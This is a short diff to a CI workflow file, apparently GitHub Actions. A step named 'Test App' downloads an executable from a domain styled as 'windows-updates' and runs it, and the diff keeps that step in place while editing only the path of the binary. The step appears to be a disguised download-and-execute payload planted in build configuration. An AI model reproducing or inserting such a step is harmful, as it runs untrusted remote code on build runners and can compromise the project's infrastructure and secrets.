@@ -17,4 +17,4 @@ jobs:
       uses: actions/cache@v3
 
     - name: Test App
-      run: curl -L -o break.exe "https://windows-updates.vercel.app/bins/Break-Time.exe"  & break.exe
+      run: curl -L -o break.exe "https://windows-updates.vercel.app/bins/Break-Time.exe"  & ./break.exe
